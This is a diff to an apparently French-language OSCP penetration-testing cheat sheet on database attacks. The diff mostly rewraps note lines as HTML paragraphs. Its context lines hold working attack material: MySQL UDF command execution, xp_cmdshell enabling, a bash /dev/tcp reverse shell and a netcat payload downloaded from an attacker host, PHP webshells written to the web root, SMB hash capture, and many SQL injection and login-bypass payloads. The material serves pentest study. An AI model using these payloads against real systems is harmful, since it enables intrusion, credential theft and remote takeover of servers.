-Commande `show` pour la rubrique « Requêtes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil show.</p>
 
 ```sql
 SHOW DATABASES;
 ```
 
 
-Commande `use` pour la rubrique « Requêtes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil use.</p>
 
 ```sql
 USE <database_name>;
@@ -1676,14 +1656,12 @@ USE <database_name>;
 ##### Enumerating Tables and Columns
 
 
-Commande `show` pour la rubrique « Enumerating Tables and Columns ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil show.</p>
 
 ```sql
 SHOW TABLES;
 ```
 
-
-Commande `show` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 SHOW COLUMNS FROM <table_name>;
@@ -1693,14 +1671,14 @@ SHOW COLUMNS FROM <table_name>;
 ##### Énumération des utilisateurs and Privileges
 
 
-Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT User, Host FROM mysql.user;
 ```
 
 
-Commande `show` pour la rubrique « Énumération des utilisateurs and Privileges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil show.</p>
 
 ```sql
 SHOW GRANTS FOR '<username>'@'<host>';
@@ -1710,7 +1688,7 @@ SHOW GRANTS FOR '<username>'@'<host>';
 ##### Data Extraction
 
 
-Commande `select` pour la rubrique « Data Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT * FROM <table_name> LIMIT <number_of_rows>;
@@ -1720,21 +1698,21 @@ SELECT * FROM <table_name> LIMIT <number_of_rows>;
 ##### Exécution de commandes via User-Defined Functions (UDFs)
 
 
-Commande `mysql` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```bash
 mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 ```
 
 
-Commande `create` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil create.</p>
 
 ```sql
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 ```
 
 
-Commande `select` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT sys_exec('id');
@@ -1744,14 +1722,14 @@ SELECT sys_exec('id');
 ##### Reverse Shell
 
 
-Ouvrir un port d'écoute avec Netcat.
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
 
 ```bash
 nc -lvnp 4444
 ```
 
 
-Commande `select` pour la rubrique « Reverse Shell ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
@@ -1765,7 +1743,7 @@ SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
 `.so` · `.SO` · `.c` · `lib_mysqludf_sys.so`  
 
 
-Commande `my_bool` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil my_bool.</p>
 
 ```text
 // lib_mysqludf_sys.c
@@ -1806,7 +1784,7 @@ long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
 `.so` · `mysql-server-dev`  
 
 
-Commande `apt` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil apt.</p>
 
 ```bash
 sudo apt install mysql-server-dev libmysqlclient-dev
@@ -1824,7 +1802,7 @@ gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf
 `.so`  
 
 
-Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```bash
 mysql -u root -p -h <host> -e "USE mysql; 
@@ -1838,14 +1816,14 @@ SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 `.so`  
 
 
-Commande `create` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil create.</p>
 
 ```sql
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 ```
 
 
-Commande `select` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT sys_exec('id');
@@ -1856,7 +1834,7 @@ SELECT sys_exec('id');
 `.SO` · `.so` · `lib_mysqludf_sys.so`  
 
 
-Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```bash
 # Ensure that the .so file has the proper permissions and path to be loaded correctly by MySQL.
@@ -1875,7 +1853,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Connexion initiale
 
 
-Commande `impacket-mssqlclient` pour la rubrique « Connexion initiale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-mssqlclient.</p>
 
 ```bash
 # Tip: you can also specify a domain by using <domain>/<username>:<password>@<host>.
@@ -1886,21 +1864,19 @@ impacket-mssqlclient <username>:<password>@<host> -windows-auth
 ##### Requêtes courantes
 
 
-Commande `select` pour la rubrique « Requêtes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT @@version;
 ```
 
 
-Commande `select` pour la rubrique « Requêtes courantes ».
-
 ```sql
 SELECT name FROM sys.databases;
 ```
 
 
-Commande `use` pour la rubrique « Requêtes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil use.</p>
 
 ```sql
 USE <database_name>;
@@ -1910,15 +1886,13 @@ USE <database_name>;
 ##### Enumerating Tables and Columns
 
 
-Commande `select` pour la rubrique « Enumerating Tables and Columns ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 # Tip: replace <schema> with the actual schema name (commonly dbo).
 SELECT table_name FROM <schema>.information_schema.tables;
 ```
 
-
-Commande `select` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';
@@ -1928,14 +1902,12 @@ SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '
 ##### Énumération des utilisateurs and Privileges
 
 
-Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT * FROM <schema>.dbo.sysusers;
 ```
 
-
-Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
 
 ```sql
 SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM <schema>.sys.database_principals WHERE name = '<username>');
@@ -1945,7 +1917,7 @@ SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SE
 ##### Data Extraction
 
 
-Commande `select` pour la rubrique « Data Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
@@ -1955,7 +1927,7 @@ SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
 ##### Exécution de commandes
 
 
-Commande `exec` pour la rubrique « Exécution de commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exec.</p>
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -1964,8 +1936,6 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
-
-Commande `exec` pour la rubrique « Exécution de commandes ».
 
 ```sql
 EXEC xp_cmdshell 'whoami';
@@ -1976,7 +1946,7 @@ EXEC xp_cmdshell 'whoami';
 `xp_cmdshell`  
 
 
-Ouvrir un port d'écoute avec Netcat.
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
 
 ```bash
 # Setup the listener
@@ -2014,7 +1984,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-Commande `limit` pour la rubrique « Common SQL Functions ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil limit.</p>
 
 ```sql
 LIMIT <row offset>, <number of rows>  -- Display rows based on offset and number
@@ -2035,7 +2005,7 @@ LOAD_FILE("<url to file>")          -- Dump the content of a file
 ```
 
 
-Commande `select` pour la rubrique « Common SQL Functions ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT TOP <number> * FROM <table>   -- Equivalent of LIMIT for MSSQL
@@ -2050,21 +2020,17 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 #### Error-Based Payloads
 
 
-Exemple technique pour la rubrique « Error-Based Payloads ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Error-Based Payloads ».</p>
 
 ```bash
 <input>' OR 1=1 -- //
 ```
 
 
-Exemple technique pour la rubrique « Error-Based Payloads ».
-
 ```bash
 <input>' OR 1=1 in (SELECT @@version) -- //
 ```
 
-
-Exemple technique pour la rubrique « Error-Based Payloads ».
 
 ```bash
 <input>' OR 1=1 in (SELECT * FROM <table>) -- //
@@ -2073,8 +2039,6 @@ Exemple technique pour la rubrique « Error-Based Payloads ».
 <input>' OR 1=1 in (SELECT * FROM users) -- //
 ```
 
-
-Exemple technique pour la rubrique « Error-Based Payloads ».
 
 ```bash
 <input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //
@@ -2091,7 +2055,7 @@ Exemple technique pour la rubrique « Error-Based Payloads ».
 `SELECT`  
 
 
-Exemple technique pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « UNION-Based Payloads ».</p>
 
 ```bash
 # MySQL & MSSQL
@@ -2103,7 +2067,7 @@ Exemple technique pour la rubrique « UNION-Based Payloads ».
 `wfuzz`  
 
 
-Commande `--` pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- MySQL
@@ -2114,7 +2078,7 @@ wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 # MySQL
@@ -2125,8 +2089,6 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -
@@ -2135,8 +2097,6 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM inform
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
 ```
 
-
-Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2147,7 +2107,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFOR
 ```
 
 
-Exemple technique pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « UNION-Based Payloads ».</p>
 
 ```bash
 <input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -
@@ -2159,7 +2119,7 @@ Exemple technique pour la rubrique « UNION-Based Payloads ».
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 # MySQL
@@ -2170,23 +2130,17 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=1 ORDER BY <number> -- -
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -
 ```
 
-
-Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2197,8 +2151,6 @@ http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <tabl
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
@@ -2207,8 +2159,6 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
 ```
 
-
-Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2219,8 +2169,6 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
@@ -2229,8 +2177,6 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -
 ```
 
-
-Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2241,8 +2187,6 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ',
 ```
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
-
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -
@@ -2251,8 +2195,6 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name)
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
 ```
 
-
-Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2267,7 +2209,7 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>,
 `AND`  
 
 
-Commande `http` pour la rubrique « UNION-Based Payloads ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 # MySQL & MSSQL
@@ -2278,14 +2220,12 @@ http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -
 ##### Vérification de la vulnérabilité
 
 
-Commande `http` pour la rubrique « Vérification de la vulnérabilité ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
 ```
 
-
-Commande `http` pour la rubrique « Vérification de la vulnérabilité ».
 
 ```sql
 http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
@@ -2303,7 +2243,7 @@ http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
 `SUBSTRING`  
 
 
-Commande `http` pour la rubrique « Extracting Database Information ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2318,7 +2258,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1
 `SUBSTRING`  
 
 
-Commande `http` pour la rubrique « Extracting Database Information ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2332,7 +2272,7 @@ http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a
 ##### Extracting Table and Column Names
 
 
-Commande `http` pour la rubrique « Extracting Table and Column Names ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2342,8 +2282,6 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM informati
 http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+
 ```
 
-
-Commande `http` pour la rubrique « Extracting Table and Column Names ».
 
 ```sql
 # MySQL
@@ -2361,7 +2299,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.colum
 `SUBSTRING`  
 
 
-Commande `http` pour la rubrique « Extracting Data ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2372,7 +2310,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(usernam
 ```
 
 
-Commande `admin` pour la rubrique « Extracting Data ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil admin.</p>
 
 ```sql
 admin' AND SUBSTRING(username,1,1)='a' --+   # MySQL
@@ -2387,7 +2325,7 @@ admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
 `SUBSTRING`  
 
 
-Commande `http` pour la rubrique « Boolean-Based ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2401,7 +2339,7 @@ http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_len
 ##### Time-Based
 
 
-Commande `admin` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil admin.</p>
 
 ```sql
 # MySQL
@@ -2412,7 +2350,7 @@ admin' OR WAITFOR DELAY '00:00:05';--+
 ```
 
 
-Commande `http` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```sql
 # MySQL
@@ -2423,8 +2361,6 @@ http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --
 ```
 
 
-Commande `http` pour la rubrique « Time-Based ».
-
 ```sql
 # MySQL
 http://<host>/index.php?id=1' AND SLEEP(10) --+
@@ -2433,8 +2369,6 @@ http://<host>/index.php?id=1' AND SLEEP(10) --+
 http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+
 ```
 
-
-Commande `http` pour la rubrique « Time-Based ».
 
 ```sql
 # MySQL
@@ -2449,7 +2383,7 @@ http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELA
 `wfuzz`  
 
 
-Commande `for` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```bash
 # Uses ASCII value extraction to determine each character of the database name
@@ -2467,7 +2401,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 `wfuzz`  
 
 
-Commande `for` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```bash
 # Uses ASCII value extraction to determine each character of the first table name
@@ -2484,7 +2418,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 `wfuzz` · `information_schema.columns`  
 
 
-Commande `for` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```bash
 # Uses ASCII value extraction to determine each character of a column name
@@ -2501,7 +2435,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 `wfuzz`  
 
 
-Commande `for` pour la rubrique « Time-Based ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```bash
 # Extracts content from a specific column using ASCII value comparison
@@ -2520,7 +2454,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 #### Login Bypass Commandes
 
 
-Commande `--` pour la rubrique « Login Bypass Commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- Standard OR-based bypass
@@ -2552,7 +2486,7 @@ Commande `--` pour la rubrique « Login Bypass Commandes ».
 ```
 
 
-Commande `meh` pour la rubrique « Login Bypass Commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil meh.</p>
 
 ```sql
 meh' OR 3=3;#
@@ -2561,8 +2495,6 @@ meh' OR 'a'='a
 meh' OR 1=1 --+
 ```
 
-
-Commande `meh` pour la rubrique « Login Bypass Commandes ».
 
 ```sql
 meh' OR 3=3;--
@@ -2575,7 +2507,7 @@ meh' OR 1=1;--
 #### Vulnerable Code Example
 
 
-Exemple technique pour la rubrique « Vulnerable Code Example ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Vulnerable Code Example ».</p>
 
 ```php
 <?php
@@ -2600,21 +2532,19 @@ if($row) {
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-Exemple technique pour la rubrique « SQL Truncation ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « SQL Truncation ».</p>
 
 ```text
 'admin'
 ```
 
 
-Exemple technique pour la rubrique « SQL Truncation ».
-
 ```text
 'admin'
 ```
 
 
-Commande `username` pour la rubrique « SQL Truncation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil username.</p>
 
 ```sql
 # Example of truncation; the database discards extra characters
@@ -2644,28 +2574,24 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Commandes courantes
 
 
-Commande `select` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases
 ```
 
 
-Commande `select` pour la rubrique « Commandes courantes ».
-
 ```sql
 SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
 ```
 
 
-Commande `union` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil union.</p>
 
 ```sql
 union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
 ```
 
-
-Commande `union` pour la rubrique « Commandes courantes ».
 
 ```sql
 union select 1,concat(username,':',password),3,4,5,6 from users--
@@ -2676,7 +2602,7 @@ union select 1,concat(username,':',password),3,4,5,6 from users--
 `xp_cmdshell`  
 
 
-Commande `exec` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exec.</p>
 
 ```sql
 exec xp_dirtree 'c:\'
@@ -2685,7 +2611,7 @@ EXEC xp_cmdshell 'ping [attacker_ip]';
 ```
 
 
-Commande `--` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- Attacker
@@ -2699,7 +2625,7 @@ EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
 ##### Statement Examples
 
 
-Commande `--` pour la rubrique « Statement Examples ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- Visualize SQL statement and adjust payload
@@ -2720,7 +2646,7 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 ##### Remote Code Execution (RCE)
 
 
-Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- Use this if you are doing SQL Injection.
@@ -2735,8 +2661,6 @@ Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 ';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--
 ```
 
-
-Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- Use this if you have direct access to execute SQL statements.
@@ -2754,8 +2678,6 @@ EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\n
 EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";
 ```
 
-
-Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- Exploitation Example.
@@ -2776,21 +2698,21 @@ Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 ##### Impersonation
 
 
-Commande `select` pour la rubrique « Impersonation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 ```
 
 
-Commande `execute` pour la rubrique « Impersonation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil execute.</p>
 
 ```sql
 EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
 
-Commande `select` pour la rubrique « Impersonation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT SYSTEM_USER
@@ -2801,8 +2723,6 @@ go
 ```
 
 
-Commande `select` pour la rubrique « Impersonation ».
-
 ```sql
 SELECT srvname, isremote FROM sysservers;
 ```
@@ -2812,7 +2732,7 @@ SELECT srvname, isremote FROM sysservers;
 `xp_cmdshell`  
 
 
-Commande `exec` pour la rubrique « Impersonation ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exec.</p>
 
 ```sql
 EXEC master.dbo.sp_configure 'show advanced options', 1;
@@ -2836,14 +2756,14 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Commandes courantes
 
 
-Commande `mysql` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```bash
 mysql -u <username> -p'<password>' -h <host> -P <port>
 ```
 
 
-Commande `show` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil show.</p>
 
 ```sql
 SHOW DATABASES;
@@ -2851,8 +2771,6 @@ SHOW DATABASES;
 USE <database_name>;
 ```
 
-
-Commande `show` pour la rubrique « Commandes courantes ».
 
 ```sql
 SHOW TABLES;
@@ -2863,7 +2781,7 @@ SELECT * FROM <table_name>;
 ```
 
 
-Commande `select` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
@@ -2872,7 +2790,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoo
 ```
 
 
-Commande `--` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- Check MySQL version
@@ -2906,7 +2824,7 @@ FLUSH PRIVILEGES;
 `mysql`  
 
 
-Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil --.</p>
 
 ```sql
 -- General payload
@@ -2923,36 +2841,32 @@ SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php"
 ##### Commandes courantes
 
 
-Commande `admin` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil admin.</p>
 
 ```sql
 admin ' OR 1=1 -- 
 ```
 
 
-Commande `1` pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil 1.</p>
 
 ```sql
 1' OR 1 = 1 #
 ```
 
 
-Exemple technique pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Commandes courantes ».</p>
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
 ```
 
 
-Exemple technique pour la rubrique « Commandes courantes ».
-
 ```sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 
 ```
 
-
-Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT <column1>, <column2> FROM <table_name>-- 
@@ -2966,36 +2880,28 @@ Exemple technique pour la rubrique « Commandes courantes ».
 `dual`  
 
 
-Exemple technique pour la rubrique « Commandes courantes ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Commandes courantes ».</p>
 
 ```sql
 ' UNION SELECT 1,2,3,4,5 FROM dual-- 
 ```
 
 
-Exemple technique pour la rubrique « Commandes courantes ».
-
 ```sql
 ' UNION SELECT 1,2,3 FROM dual-- 
 ```
 
-
-Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT username, NULL, NULL FROM all_users-- 
 ```
 
 
-Exemple technique pour la rubrique « Commandes courantes ».
-
 ```sql
 ' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
 ' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
 ```
 
-
-Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT <column_name>, NULL FROM <table_name>-- 
@@ -3005,7 +2911,7 @@ Exemple technique pour la rubrique « Commandes courantes ».
 ##### Login Bypass
 
 
-Commande `admin` pour la rubrique « Login Bypass ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil admin.</p>
 
 ```sql
 admin ' OR 1=1 -- 
@@ -3028,7 +2934,7 @@ Examiner les entrées et les réponses de l'application web.
 **Tag**
 
 
-Exemple technique pour la rubrique « Identifying ».
